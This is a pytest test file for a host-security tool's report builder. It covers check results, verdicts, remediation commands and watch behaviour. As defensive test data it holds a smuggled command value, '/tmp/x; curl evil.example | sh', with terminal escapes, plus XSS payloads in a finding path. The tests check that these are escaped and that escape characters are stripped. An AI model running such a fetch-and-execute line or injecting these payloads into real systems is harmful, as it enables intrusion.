"""The security report: every check's latest result, incidents and the setup, in plain language, with the choices
for each finding as exact commands. Everything a finding names may be an attacker's choice."""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
import json
import os
from pathlib import Path
import shlex
import subprocess

import pytest

from megalodon import results
from megalodon import security_report as sr

NOW = datetime(2026, 11, 26, 8, 0, tzinfo=timezone.utc)
AT = NOW.strftime("%Y-%m-%dT%H:%M:%SZ")


@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    (tmp_path / "home/.config/megalodon").mkdir(parents=True)
    return tmp_path / "home"


def keep(check, findings, code=None, at=AT, **extra):
    result = dict(findings=findings, **extra)
    return results.keep(check, result, 1 if findings else 0 if code is None else code, now=at)


def build(**kw):
    return sr.build(now=NOW, system=False, **kw)


def view(report, check):
    return next(c for c in report["checks"] if c["check"] == check)


# ------------------------------------------------------------------ the results store

def test_results_are_private_and_only_the_latest_is_kept(home):
    path = keep("hardening", [dict(rule_id="X", severity="HIGH")])
    keep("hardening", [])
    assert path.stat().st_mode & 0o777 == 0o600 and path.parent.stat().st_mode & 0o777 == 0o700
    latest = results.latest()
    assert list(latest) == ["hardening"] and latest["hardening"]["findings"] == 0
    with pytest.raises(results.ResultError):
        results.keep("not-a-check", {}, 0)


def test_a_result_others_could_write_is_not_trusted(home):
    path = keep("persistence", [])
    os.chmod(path, 0o644)
    assert "must be a mode-600 file" in results.latest()["persistence"]["error"]
    assert view(build(), "persistence")["status"] == "error"


def test_a_very_large_result_keeps_its_first_findings_and_its_count(home, monkeypatch):
    monkeypatch.setattr(results, "MAX_BYTES", 100_000)     # room for 500 findings, not 2,000
    keep("secrets", [dict(rule_id="SECRET", severity="HIGH", path=f"/srv/{n}" * 3) for n in range(2000)])
    record = results.latest()["secrets"]
    assert record["findings"] == 2000 and record["truncated"] and len(record["result"]["findings"]) == 500


def run_cli(argv):
    from megalodon.cli import main
    try:
        main(argv)
    except SystemExit as exit_:
        return exit_.code


def test_a_check_keeps_its_result_with_its_exit_code(home, monkeypatch, capsys):
    from megalodon import persistence_watch, hardening_drift
    finding = dict(change="added", category="cron", location="/etc/cron.d/x", severity="HIGH",
                   technique="T1053.003")
    monkeypatch.setattr(persistence_watch, "check", lambda *a, **k: dict(findings=[finding], gaps=[]))
    assert run_cli(["persistence", "check"]) == 1
    record = results.latest()["persistence"]
    assert (record["exit_code"], record["findings"], record["ran"]) == (1, 1, True)
    # A check that could not run is kept too: the report says it is broken, not clean.
    def broken(*a, **k):
        raise hardening_drift.HardeningError("no baseline")
    monkeypatch.setattr(hardening_drift, "check", broken)
    assert run_cli(["hardening", "check"]) == 2
    assert results.latest()["hardening"]["ran"] is False


def test_a_check_that_could_not_run_says_why(home, monkeypatch, capsys):
    from megalodon import hardening_drift

    def broken(*a, **k):
        raise hardening_drift.HardeningError("no hardening baseline; run megalodon hardening baseline")
    monkeypatch.setattr(hardening_drift, "check", broken)
    assert run_cli(["hardening", "check"]) == 2
    assert "no hardening baseline" in capsys.readouterr().err, "the person at the terminal still sees it"
    assert results.latest()["hardening"]["reason"] == "no hardening baseline; run megalodon hardening baseline"
    import sys
    assert type(sys.stderr).__name__ != "_Said", "stderr is put back"
    hardening = view(build(), "hardening")
    assert hardening["status"] == "error"
    assert hardening["status_text"] == "Could not run: no hardening baseline; run megalodon hardening baseline"
    assert hardening["next"] == "megalodon hardening baseline", "the fix it names, not the same check again"
    results.keep("boot", None, 2, now=AT, reason="the boot log could not be read")
    assert view(build(), "boot")["next"] == "megalodon boot check"
    results.keep("logins", None, 2, now=AT, reason="no baseline at /x; run megalodon logins learn")
    assert view(build(), "logins")["next"] == "megalodon logins learn"
    # Only the check's own baseline command, and only as the line's last words, not one a path could name.
    results.keep("binaries", None, 2, now=AT, reason="/srv/; run megalodon boot baseline/x could not be read")
    assert view(build(), "binaries")["next"] == "megalodon binaries check"
    assert any(step["command"] == "megalodon hardening baseline" for step in build()["next_steps"])
    keep("hardening", [])
    assert "reason" not in results.latest()["hardening"], "a run that worked has no reason"


def test_a_check_that_crashes_replaces_its_older_result(home, monkeypatch, capsys):
    # An older clean result must not be shown as current when the check now stops with an error.
    from megalodon import persistence_watch
    keep("persistence", [])

    def crash(*a, **k):
        raise RuntimeError("the table could not be read")
    monkeypatch.setattr(persistence_watch, "check", crash)
    with pytest.raises(RuntimeError):
        run_cli(["persistence", "check"])
    record = results.latest()["persistence"]
    assert (record["exit_code"], record["ran"]) == (2, False)
    assert record["reason"] == "it stopped with an error: RuntimeError: the table could not be read"
    assert view(build(), "persistence")["status"] == "error"
    import sys
    assert type(sys.stderr).__name__ != "_Said", "stderr is put back"


def test_a_hostile_reason_is_cleaned(home):
    results.keep("boot", None, 2, now=AT, reason="bad\x1b[2J\u202eline")
    assert view(build(), "boot")["status_text"] == "Could not run: bad?[2J?line"


def test_only_a_check_of_this_machines_own_baseline_is_kept(home, monkeypatch, tmp_path):
    from megalodon import persistence_watch
    monkeypatch.setattr(persistence_watch, "check", lambda *a, **k: dict(findings=[], gaps=[]))
    monkeypatch.setattr(persistence_watch, "baseline", lambda *a, **k: dict(action="baseline"))
    run_cli(["persistence", "check", "--manifest", str(tmp_path / "other.json")])
    run_cli(["persistence", "baseline"])
    assert results.latest() == {}


# ------------------------------------------------------------------ statuses and the verdict

def test_each_check_says_whether_it_is_clear_to_review_broken_or_not_run(home):
    keep("hardening", [])
    keep("persistence", [dict(change="added", category="cron", location="/etc/cron.d/x", severity="HIGH")])
    results.keep("boot", None, 2, now=AT)
    report = build()
    assert view(report, "hardening")["status"] == "clean"
    assert view(report, "persistence")["status"] == "findings"
    assert view(report, "boot")["status"] == "error" and view(report, "boot")["next"] == "megalodon boot check"
    assert view(report, "vulns")["status"] == "never_run"
    assert report["verdict"] == "act" and report["counts"]["HIGH"] == 1


def test_a_result_far_older_than_its_schedule_is_out_of_date(home):
    keep("hardening", [], at=(NOW - timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%SZ"))   # hourly
    keep("binaries", [], at=(NOW - timedelta(days=2)).strftime("%Y-%m-%dT%H:%M:%SZ"))    # daily
    report = build()
    assert view(report, "hardening")["stale"] and "2 days ago" in view(report, "hardening")["status_text"]
    assert not view(report, "binaries").get("stale")


@pytest.mark.parametrize("worst, verdict", [("CRITICAL", "act"), ("HIGH", "act"), ("MEDIUM", "review"),
                                            ("LOW", "review"), ("INFO", "review")])
def test_the_verdict_follows_the_worst_finding(home, worst, verdict):
    keep("hardening", [dict(rule_id="X", severity=worst, subject="s")])
    assert build()["verdict"] == verdict


def test_all_clear_only_when_everything_ran_and_is_set_up(home, monkeypatch):
    for name in results.NAMES:
        keep(name, [])
    monkeypatch.setattr(sr, "_setup", lambda system: [dict(item="x", ok=True, text="fine")])
    assert build()["verdict"] == "clear"
    monkeypatch.setattr(sr, "_setup", lambda system: [dict(item="x", ok=False, text="alerts off", fix="f")])
    assert build()["verdict"] == "gaps"


def test_live_watches_say_whether_their_service_runs(home, monkeypatch, tmp_path):
    from megalodon import schedule
    units = tmp_path / "units"
    units.mkdir()
    monkeypatch.setattr(schedule, "unit_dir", lambda system: units)
    for name in ("credentials", "egress"):
        (units / f"megalodon-{name}.service").write_text(schedule.MARKER)

    def systemctl(system, *args):
        state = "active" if "megalodon-credentials.service" in args else "failed"
        return subprocess.CompletedProcess(args, 0, f"UnitFileState=enabled\nActiveState={state}\n", "")
    report = sr.build(now=NOW, system=False, runner=systemctl)
    assert view(report, "credentials")["status"] == "watching"
    egress = view(report, "egress")
    assert egress["status"] == "error" and "not running (systemd: failed)" in egress["status_text"]
    assert egress["next"] == "systemctl --user start megalodon-egress.service", "a user schedule: no sudo"
    assert any(step["command"] == egress["next"] for step in report["next_steps"])
    as_root = sr.build(now=NOW, system=True, runner=systemctl)
    assert view(as_root, "egress")["next"] == "sudo systemctl start megalodon-egress.service"
    assert view(report, "ancestry")["status"] == "never_run", "not installed: nothing to say it watches"


# ------------------------------------------------------------------ what each finding means, and the choices

def test_a_finding_says_what_it_means_and_the_choices_are_commands(home):
    keep("persistence", [dict(change="added", category="cron", location="/etc/cron.d/x", severity="HIGH")])
    finding = view(build(), "persistence")["findings"][0]
    assert finding["rule_id"] == "PERSISTENCE_ADDED" and "start by itself" in finding["meaning"]
    commands = {}
    for choice in finding["choices"]:
        commands.setdefault(choice["choice"], choice["command"])   # the first of each kind
    assert commands["look"] == "megalodon persistence check"
    assert commands["evidence"] == "sudo megalodon evidence collect"
    assert commands["expected"] == "megalodon persistence accept"
    assert commands["contain"] == "megalodon enforce run --dry-run"
    timeline = [c["command"] for c in finding["choices"] if "timeline" in c["command"]]
    assert timeline == ["megalodon timeline show --entity persistence:cron:/etc/cron.d/x"]


def test_meanings_come_from_each_checks_own_rules(home):
    from megalodon import vuln_check
    keep("vulns", [dict(rule_id="KERNEL_FIX_NOT_RUNNING", severity="HIGH", subject="kernel")])
    finding = view(build(), "vulns")["findings"][0]
    assert finding["meaning"] == vuln_check.RULES["KERNEL_FIX_NOT_RUNNING"][2]
    assert [c["command"] for c in finding["choices"] if c["choice"] == "fix"] == ["sudo reboot"]
    assert not [c for c in finding["choices"] if c["choice"] in ("evidence", "contain")], "a weak spot, not a break-in"


def test_watches_with_allow_lists_allow_the_one_program(home):
    keep("ancestry", [dict(rule_id="SERVICE_SPAWNED_SHELL", severity="HIGH", evidence=dict(
        program="/usr/bin/dash", service=dict(program="/usr/sbin/nginx")))])
    keep("egress", [dict(rule_id="NEW_OUTBOUND_PROGRAM", severity="HIGH", program="/opt/agent", address="9.9.9.9")])
    report = build()
    allow = lambda check: [c["command"] for c in view(report, check)["findings"][0]["choices"]
                           if c["choice"] == "expected"]
    assert allow("ancestry") == ["megalodon ancestry allow /usr/sbin/nginx /usr/bin/dash"]
    assert allow("egress") == ["megalodon egress allow /opt/agent"]


HOSTILE = "/tmp/x; curl evil.example | sh\x1b[2J‮"


def test_a_hostile_name_cannot_become_a_second_command(home):
    keep("egress", [dict(rule_id="NEW_OUTBOUND_PROGRAM", severity="HIGH", program=HOSTILE, address="9.9.9.9")])
    finding = view(build(), "egress")["findings"][0]
    allow = next(c["command"] for c in finding["choices"] if c["choice"] == "expected")
    assert shlex.split(allow) == ["megalodon", "egress", "allow", "/tmp/x; curl evil.example | sh?[2J?"]
    assert "\x1b" not in json.dumps(finding) and "‮" not in json.dumps(finding)


def test_the_page_escapes_everything_and_loads_nothing(home):
    keep("webroot", [dict(rule_id="SCRIPT_IN_UPLOADS", severity="CRITICAL", path="/var/www/<script>alert(1)</script>.php",
                          detail="<img src=x onerror=alert(1)>")])
    page = sr.page(build())
    assert "<script>" not in page and "&lt;script&gt;" in page and "onerror=alert(1)>" not in page
    assert "default-src 'none'" in page and "http://" not in page and "https://" not in page.replace(
        "https://your-monitor.example/ping", "")


def test_the_text_report_has_no_terminal_escapes(home):
    keep("persistence", [dict(change="added", category="cron", location=HOSTILE, severity="HIGH")])
    text = sr.text(build())
    assert "\x1b" not in text and "‮" not in text and "Act now" in text


def test_details_and_gaps_read_as_words(home):
    keep("persistence", [dict(change="added", category="autostart", location="~/.config/autostart/u.desktop",
                              severity="HIGH", detail=dict(kind="file", signs=[dict(sign="runs_from_temporary",
                                                                                   line=3)]))],
         gaps=[dict(category="kernel_module", location="/proc/modules")])
    persistence = view(build(), "persistence")
    assert persistence["findings"][0]["detail"] == "kind: file; signs: runs from temporary (line 3)"
    assert persistence["gaps"] == ["kernel module at /proc/modules"]


# ------------------------------------------------------------------ setup and incidents

def test_the_setup_says_what_is_missing_and_how_to_set_it(home):
    rows = {r["item"]: r for r in build()["setup"]}
    assert rows["alerts"]["ok"] is False and rows["response"]["fix"] == "megalodon respond init"
    assert rows["enforcement"]["ok"] is None, "off is the owner's choice, not a fault"
    (home / ".config/megalodon/settings.toml").write_text("[alerts\n")
    rows = {r["item"]: r for r in build()["setup"]}
    assert "cannot be read" in rows["alerts"]["text"]


def test_incidents_come_from_the_response_engine_with_their_choices(home):
    from megalodon import response_engine as engine
    engine.write_default_policy()
    report = dict(checked_at=AT, findings=[dict(rule_id="PACKAGE_MISMATCH", severity="CRITICAL", path="/usr/bin/ls")])
    engine.run(signals=engine.path_signals(report, "binaries", "path"), now=NOW, protected=set())
    built = build()
    [incident] = built["incidents"]
    assert incident["severity"] == "CRITICAL" and incident["rules"] == ["PACKAGE_MISMATCH"]
    assert incident["choices"][0]["command"] == f"megalodon timeline show {incident['incident']}"
    assert built["verdict"] == "act"


# ------------------------------------------------------------------ the command and the schedule

def test_the_command_writes_a_private_page_and_prints_the_verdict(home, tmp_path, capsys):
    keep("hardening", [dict(rule_id="X", severity="MEDIUM", subject="s")])
    target = tmp_path / "report.html"
    assert run_cli(["report", "--format", "html", "--output", str(target)]) == 0
    assert json.loads(capsys.readouterr().out)["verdict"] == "review"
    assert target.stat().st_mode & 0o777 == 0o600 and target.read_text().startswith("<!doctype html>")
    assert run_cli(["report", "--format", "json"]) == 0
    assert json.loads(capsys.readouterr().out)["schema"] == sr.SCHEMA
    assert run_cli(["report"]) == 0 and "Review:" in capsys.readouterr().out
    assert run_cli(["report", "--hours", "0"]) == 2


def test_the_schedule_writes_the_page_every_morning():
    from megalodon import schedule
    from megalodon.cli import build_parser
    job = next(j for j in schedule.JOBS if j.name == "report")
    assert job.calendar == "*-*-* 07:47:00" and job.interval == 86400 and not job.root_only
    args = build_parser().parse_args(list(job.command))
    assert (args.format, str(args.output)) == ("html", "~/.local/state/megalodon/report.html")


# ------------------------------------------------------------------ findings survive a failed alert or a stopped watch

def test_findings_of_a_run_that_also_failed_are_kept(home):
    # A check that found something and then could not send its alert exits 2: its findings must still count.
    finding = dict(change="added", category="cron", location="/etc/cron.d/x", severity="HIGH")
    results.keep("persistence", dict(findings=[finding], gaps=[]), 2, now=AT,
                 reason="alerts unavailable: the settings file does not parse")
    report = build()
    persistence = view(report, "persistence")
    assert persistence["status"] == "findings" and persistence["findings"][0]["rule_id"] == "PERSISTENCE_ADDED"
    assert report["verdict"] == "act" and report["counts"]["HIGH"] == 1
    assert "alerts unavailable" in persistence["problem"]
    assert any("alerts unavailable" in step["text"] for step in report["next_steps"])


def test_findings_of_a_live_check_whose_watch_stopped_are_kept(home, monkeypatch, tmp_path):
    from megalodon import schedule
    units = tmp_path / "units"
    units.mkdir()
    monkeypatch.setattr(schedule, "unit_dir", lambda system: units)
    (units / "megalodon-egress.service").write_text(schedule.MARKER)
    keep("egress", [dict(rule_id="NEW_OUTBOUND_PROGRAM", severity="HIGH", program="/tmp/x", address="9.9.9.9")])

    def systemctl(system, *args):
        return subprocess.CompletedProcess(args, 0, "UnitFileState=enabled\nActiveState=failed\n", "")
    report = sr.build(now=NOW, system=False, runner=systemctl)
    egress = view(report, "egress")
    assert egress["findings"] and report["verdict"] == "act"
    assert "not running" in egress["problem"]
    assert any(step["command"] == "systemctl --user start megalodon-egress.service" for step in report["next_steps"])


def test_an_interpreted_service_is_allowed_by_what_it_runs(home):
    # The ancestry allow list matches an application service by its runtime and what it runs (`allow_as`).
    keep("ancestry", [dict(rule_id="SERVICE_SPAWNED_SHELL", severity="HIGH", evidence=dict(
        program="/bin/sh", service=dict(program="/usr/bin/python3", allow_as="/usr/bin/python3 /srv/app.py")))])
    choices = view(build(), "ancestry")["findings"][0]["choices"]
    allow = next(c for c in choices if c["choice"] == "expected")
    assert allow["argv"] == ["megalodon", "ancestry", "allow", "/usr/bin/python3 /srv/app.py", "/bin/sh"]


def test_a_clean_result_does_not_hide_a_stopped_watch(home, monkeypatch, tmp_path):
    from megalodon import schedule
    units = tmp_path / "units"
    units.mkdir()
    monkeypatch.setattr(schedule, "unit_dir", lambda system: units)
    (units / "megalodon-egress.service").write_text(schedule.MARKER)
    keep("egress", [])

    def systemctl(system, *args):
        return subprocess.CompletedProcess(args, 0, "UnitFileState=enabled\nActiveState=failed\n", "")
    report = sr.build(now=NOW, system=False, runner=systemctl)
    egress = view(report, "egress")
    assert egress["status"] == "clean" and "not running" in egress["status_text"]
    assert report["verdict"] != "clear" and report["coverage"]["errors"] >= 1


def test_the_totals_count_every_finding_not_only_those_shown(home):
    keep("secrets", [dict(rule_id="SECRET_IN_WEB_ROOT", severity="HIGH", path=f"/var/www/{n}.env") for n in range(40)])
    report = build()
    assert report["counts"]["HIGH"] == 40 and len(view(report, "secrets")["findings"]) == sr.SHOWN_PER_CHECK
    assert view(report, "secrets")["more"] == 15
    assert "…and 15 more: megalodon report --all" in sr.text(report)
    assert "…and 15 more: <code>megalodon report --all</code>" in sr.page(report)


# ------------------------------------------------------------------ settings read as the modules that use them read them

def _enforce_on(home, actions='["block_address"]', playbooks='["dropped-tool-phoning-home"]'):
    from megalodon import enforcement, response_engine as engine
    engine.write_default_policy()
    enforcement.init()
    path = home / ".config/megalodon/enforce.toml"
    text = path.read_text()
    text = text.replace("enabled = false", "enabled = true").replace("actions = []", f"actions = {actions}")
    path.write_text(text.replace("playbooks = []", f"playbooks = {playbooks}"))
    return path


def test_enforcement_that_is_on_is_reported_as_on(home):
    _enforce_on(home)
    row = {r["item"]: r for r in build()["setup"]}["enforcement"]
    assert row["ok"] is True and row["text"].startswith("On for block_address in 1 playbook(s)")


def test_enforcement_pinned_to_another_response_policy_does_nothing(home):
    _enforce_on(home)
    policy = home / ".config/megalodon/response-policy.toml"
    policy.write_text(policy.read_text() + "\n# edited after it was pinned\n")
    report = build()
    row = {r["item"]: r for r in report["setup"]}["enforcement"]
    assert row["ok"] is False and "not the one it pinned" in row["text"]
    assert any(step["command"] == "megalodon enforce init --replace" for step in report["next_steps"])


def test_policies_the_modules_would_refuse_are_reported(home):
    config = home / ".config/megalodon"
    (config / "response-policy.toml").write_text("[response]\nnot_a_setting = 1\n")
    os.chmod(config / "response-policy.toml", 0o600)
    (config / "enforce.toml").write_text("[enforcement]\nenabled = true\n")
    os.chmod(config / "enforce.toml", 0o600)
    (config / "heartbeat.json").write_text("{}")
    os.chmod(config / "heartbeat.json", 0o600)
    rows = {r["item"]: r for r in build()["setup"]}
    assert rows["response"]["ok"] is False and "cannot be used" in rows["response"]["text"]
    assert rows["enforcement"]["ok"] is False and "cannot be used" in rows["enforcement"]["text"]
    assert rows["heartbeat"]["ok"] is False and "cannot be sent" in rows["heartbeat"]["text"]


def test_unreadable_incidents_are_never_all_clear(home, monkeypatch):
    from megalodon import timeline
    for name in results.NAMES:
        keep(name, [])
    monkeypatch.setattr(sr, "_setup", lambda system: [])

    def unreadable(**kw):
        raise OSError("the ledger is not readable")
    assert build()["verdict"] == "clear", "the control: everything ran clean"
    monkeypatch.setattr(timeline, "incidents", unreadable)
    report = build()
    assert report["verdict"] == "gaps" and "Incidents could not be read" in report["incident_gap"]
    assert any(step["command"] == "megalodon timeline list" for step in report["next_steps"])


def test_enforcement_with_no_playbook_carries_nothing_out(home):
    _enforce_on(home, playbooks="[]")
    row = {r["item"]: r for r in build()["setup"]}["enforcement"]
    assert row["ok"] is None and row["text"].startswith("Off:")


def test_without_systemd_the_schedule_is_not_called_missing(home, monkeypatch, tmp_path):
    from megalodon import schedule
    monkeypatch.setattr(schedule, "unit_dir", lambda system: tmp_path / "no-units")
    monkeypatch.setattr(schedule, "has_systemd", lambda: False)
    row = {r["item"]: r for r in build()["setup"]}["schedule"]
    assert row["ok"] is None and "crontab" in row["text"]
    assert all("schedule install" not in step["command"] for step in build()["next_steps"]), \
        "install refuses without systemd: the steps say plan"
    monkeypatch.setattr(schedule, "has_systemd", lambda: True)
    row = {r["item"]: r for r in build()["setup"]}["schedule"]
    assert row["ok"] is False and row["fix"] == "sudo megalodon schedule plan"


# ------------------------------------------------------------------ all clear only when nothing at all was found or missed

def _all_ran_clean(monkeypatch):
    for name in results.NAMES:
        keep(name, [])
    monkeypatch.setattr(sr, "_setup", lambda system: [])


def test_low_findings_are_not_all_clear(home, monkeypatch):
    _all_ran_clean(monkeypatch)
    assert build()["verdict"] == "clear", "the control"
    keep("hardening", [dict(rule_id="X", severity="LOW", subject="s")])
    report = build()
    assert report["verdict"] == "review" and report["counts"]["LOW"] == 1
    assert not report["headline"].startswith("All clear")


def test_what_a_check_could_not_look_at_is_not_all_clear(home, monkeypatch):
    _all_ran_clean(monkeypatch)
    keep("boot", [], gaps=["the EFI system partition is not mounted"])
    report = build()
    assert "Could not see: the EFI system partition is not mounted" in sr.text(report)
    assert report["verdict"] == "gaps"
    step = next(s for s in report["next_steps"] if "EFI system partition" in s["text"])
    assert step["command"] == "megalodon boot check"


def test_totals_survive_a_result_too_large_to_keep_whole(home, monkeypatch):
    monkeypatch.setattr(results, "MAX_BYTES", 200_000)
    keep("secrets", [dict(rule_id="SECRET_IN_WEB_ROOT", severity="HIGH", path=f"/var/www/{n}", detail="x" * 2200)
                     for n in range(2000)])
    record = results.latest()["secrets"]
    assert record["truncated"] and len(record["result"]["findings"]) < 2000
    assert build()["counts"]["HIGH"] == 2000


# ------------------------------------------------------------------ what a check found, however it says so

def test_suspicious_persistence_entries_are_findings(home):
    # A baseline made before signs were reviewed: the check lists suspicious existing entries and exits 1.
    second_root = dict(category="account", location="toor", technique="T1136.001", severity="CRITICAL",
                       signs=[dict(sign="second_uid_0", line=0)])
    results.keep("persistence", dict(findings=[], suspicious=[second_root], gaps=[]), 1, now=AT)
    report = build()
    persistence = view(report, "persistence")
    assert persistence["findings"][0]["rule_id"] == "PERSISTENCE_SUSPICIOUS"
    assert persistence["findings"][0]["where"] == "toor" and persistence["finding_count"] == 1
    assert report["verdict"] == "act" and report["counts"]["CRITICAL"] == 1


def test_a_check_that_found_something_is_never_nothing_found(home):
    results.keep("rootkit", dict(hidden=["pid 4242"], gaps=[]), 1, now=AT)     # a shape the report cannot list
    rootkit = view(build(), "rootkit")
    assert rootkit["status"] == "findings" and rootkit["findings"][0]["rule_id"] == "CHECK_REPORTED_SOMETHING"
    assert rootkit["findings"][0]["choices"][0]["command"] == "megalodon rootkit check"


def test_a_result_that_cannot_be_opened_is_that_checks_error(home, tmp_path):
    keep("hardening", [])
    folder = Path(results.DEFAULT_FOLDER).expanduser()
    (tmp_path / "elsewhere.json").write_text("{}")
    os.symlink(tmp_path / "elsewhere.json", folder / "boot.json")
    report = build()
    assert view(report, "boot")["status"] == "error" and "cannot be read" in view(report, "boot")["status_text"]
    assert view(report, "hardening")["status"] == "clean", "every other check is still reported"


def test_what_a_live_watch_sees_is_kept_until_accept(home, monkeypatch):
    import argparse
    from megalodon import cli, listener_watch
    kept = cli._watch_keeper(argparse.Namespace(manifest=None), "listeners")
    old = (NOW - timedelta(days=3)).strftime("%Y-%m-%dT%H:%M:%SZ")
    results.add_seen("listeners", dict(rule_id="NEW_LISTENER", severity="HIGH", listener="tcp/0.0.0.0:4444",
                                       programs=[]), now=old)        # seen three days ago, gone since
    listeners = view(build(), "listeners")
    assert listeners["findings"][0]["where"] == "tcp/0.0.0.0:4444" and not listeners.get("stale")
    assert "its watch saw some" in listeners["status_text"]
    cli._watch_keeper(argparse.Namespace(manifest="/other.json"), "listeners")(dict(rule_id="X", severity="HIGH"))
    assert results.seen("listeners")["total"] == 1, "a watch of another baseline keeps nothing"
    kept(dict(rule_id="NEW_LISTENER", severity="HIGH", listener="tcp/0.0.0.0:4444", programs=[]))
    monkeypatch.setattr(listener_watch, "accept", lambda *a, **k: dict(action="accept"))
    assert run_cli(["listeners", "accept"]) == 0
    assert "listeners" not in results.latest(), "reviewed and accepted: no longer to review"


def test_accept_clears_what_the_last_listener_check_found_too(home, monkeypatch):
    # The watch adds to the kept result; under systemd no scheduled check replaces it, so accept must clear it.
    from megalodon import listener_watch
    keep("listeners", [dict(rule_id="NEW_LISTENER", severity="HIGH", listener="tcp/0.0.0.0:22")])
    monkeypatch.setattr(listener_watch, "accept", lambda *a, **k: dict(action="accept"))
    run_cli(["listeners", "accept"])
    assert "listeners" not in results.latest()


def test_the_watch_adds_to_what_the_last_check_found(home):
    keep("listeners", [dict(rule_id="NEW_LISTENER", severity="HIGH", listener="tcp/0.0.0.0:22")])
    _keeper()(_seen(4444))
    assert [f["where"] for f in view(build(), "listeners")["findings"]] == ["tcp/0.0.0.0:22", "tcp/0.0.0.0:4444"]

@pytest.mark.parametrize("check, module, found", [
    ("listeners", "listener_watch", dict(rule_id="NEW_LISTENER", severity="HIGH", listener="tcp/0.0.0.0:4444",
                                         programs=[], techniques=[])),
    ("webroot", "webroot_watch", dict(rule_id="WEB_SHELL_PATTERN", severity="HIGH", path="/var/www/up/x.php",
                                      detail="d", summary="s", techniques=[])),
])
def test_the_watch_commands_keep_what_they_see(home, monkeypatch, check, module, found, capsys):
    import importlib
    watch = importlib.import_module(f"megalodon.{module}")

    class Once:
        def __init__(self, manifest, emit, **kw):
            self.emit = emit

        def run(self, stop, *a, **k):
            self.emit(found)
    monkeypatch.setattr(watch, "Watcher", Once)
    run_cli([check, "watch"])
    assert results.seen(check)["findings"] == [found]


# ------------------------------------------------------------------ what a watch keeps is the saved result, not a copy in memory

def _keeper():
    import argparse
    from megalodon import cli
    return cli._watch_keeper(argparse.Namespace(manifest=None), "listeners")


def _seen(n, severity="HIGH"):
    return dict(rule_id="NEW_LISTENER", severity=severity, listener=f"tcp/0.0.0.0:{n}", programs=[])


def test_a_restarted_watch_keeps_what_it_saw_before(home):
    _keeper()(_seen(1))
    _keeper()(_seen(2))                                   # the watch restarted
    assert [f["where"] for f in view(build(), "listeners")["findings"]] == ["tcp/0.0.0.0:1", "tcp/0.0.0.0:2"]


def test_what_was_accepted_or_checked_since_does_not_come_back(home):
    kept = _keeper()
    kept(_seen(1))
    results.forget("listeners")                           # accept, while the watch runs on
    kept(_seen(2))
    assert [f["where"] for f in view(build(), "listeners")["findings"]] == ["tcp/0.0.0.0:2"]
    keep("listeners", [])                                 # a check, which cannot see what is gone, keeps it
    kept(_seen(3))
    assert [f["where"] for f in view(build(), "listeners")["findings"]] == ["tcp/0.0.0.0:2", "tcp/0.0.0.0:3"]


def test_a_watch_counts_every_finding_beyond_those_it_keeps(home):
    kept = _keeper()
    kept(_seen(0, "HIGH"))
    for n in range(1, results.MAX_FINDINGS + 1):
        kept(_seen(n, "LOW"))
    report = build()
    listeners = view(report, "listeners")
    assert report["counts"]["HIGH"] == 1 and report["counts"]["LOW"] == results.MAX_FINDINGS
    assert listeners["finding_count"] == results.MAX_FINDINGS + 1 and report["verdict"] == "act"
    assert len(results.seen("listeners")["findings"]) == results.MAX_FINDINGS, "the latest are kept"


def test_the_watch_keeps_what_a_check_found_before_its_alert_failed(home):
    results.keep("listeners", dict(findings=[_seen(22)], gaps=[]), 2, now=AT, reason="alerts unavailable")
    _keeper()(_seen(4444))
    assert [f["where"] for f in view(build(), "listeners")["findings"]] == ["tcp/0.0.0.0:22", "tcp/0.0.0.0:4444"]


def test_every_kept_finding_is_listed_read_only(home):
    keep("secrets", [dict(rule_id="SECRET_IN_WEB_ROOT", severity="HIGH", path=f"/var/www/{n}.env") for n in range(40)])
    every = build(every=True)
    assert len(view(every, "secrets")["findings"]) == 40 and view(every, "secrets")["more"] == 0


def test_findings_counted_but_not_kept_are_said_so(home, monkeypatch):
    monkeypatch.setattr(results, "MAX_BYTES", 100_000)
    keep("secrets", [dict(rule_id="SECRET_IN_WEB_ROOT", severity="HIGH", path=f"/srv/{n}" * 3) for n in range(2000)])
    secrets = view(build(every=True), "secrets")
    assert len(secrets["findings"]) == 500 and secrets["not_kept"] == 1500
    assert "…and 1500 more that were counted but not kept" in sr.text(build(every=True))


def test_the_report_command_lists_all_with_all(home, capsys):
    keep("secrets", [dict(rule_id="SECRET_IN_WEB_ROOT", severity="HIGH", path=f"/var/www/{n}.env") for n in range(30)])
    assert run_cli(["report", "--all", "--format", "json"]) == 0
    printed = json.loads(capsys.readouterr().out)
    assert len(view(printed, "secrets")["findings"]) == 30


def test_a_check_keeps_what_the_watch_saw_of_things_since_gone(home, monkeypatch):
    # The watch saw a listener that has since closed; a check cannot see it, and must not erase it.
    from megalodon import listener_watch
    _keeper()(_seen(4444))
    monkeypatch.setattr(listener_watch, "check", lambda *a, **k: dict(findings=[], gaps=[]))
    assert run_cli(["listeners", "check"]) == 0
    listeners = view(build(), "listeners")
    assert [f["where"] for f in listeners["findings"]] == ["tcp/0.0.0.0:4444"]
    monkeypatch.setattr(listener_watch, "check", lambda *a, **k: dict(findings=[_seen(22), _seen(4444)], gaps=[]))
    run_cli(["listeners", "check"])
    listeners = view(build(), "listeners")
    assert [f["where"] for f in listeners["findings"]] == ["tcp/0.0.0.0:22", "tcp/0.0.0.0:4444"], "once each"
    assert listeners["finding_count"] == 2
    monkeypatch.setattr(listener_watch, "accept", lambda *a, **k: dict(action="accept"))
    run_cli(["listeners", "accept"])
    run_cli(["listeners", "check"])
    assert [f["where"] for f in view(build(), "listeners")["findings"]] == ["tcp/0.0.0.0:22", "tcp/0.0.0.0:4444"]


def test_a_check_keeps_the_watch_totals_beyond_those_kept(home, monkeypatch):
    from megalodon import listener_watch
    kept = _keeper()
    kept(_seen(0, "HIGH"))
    for n in range(1, results.MAX_FINDINGS + 1):
        kept(_seen(n, "LOW"))
    monkeypatch.setattr(listener_watch, "check", lambda *a, **k: dict(findings=[], gaps=[]))
    run_cli(["listeners", "check"])
    report = build()
    assert report["counts"]["HIGH"] == 1 and view(report, "listeners")["finding_count"] == results.MAX_FINDINGS + 1


def test_a_finding_the_watch_stamped_is_the_same_finding_a_check_makes(home, monkeypatch):
    # The watch adds when it sent it (and, for the web root, whether it is still there); a check does not.
    from megalodon import listener_watch
    _keeper()(dict(_seen(22), detected_at="2026-11-26T07:00:00Z"))
    monkeypatch.setattr(listener_watch, "check", lambda *a, **k: dict(findings=[_seen(22)], gaps=[]))
    run_cli(["listeners", "check"])
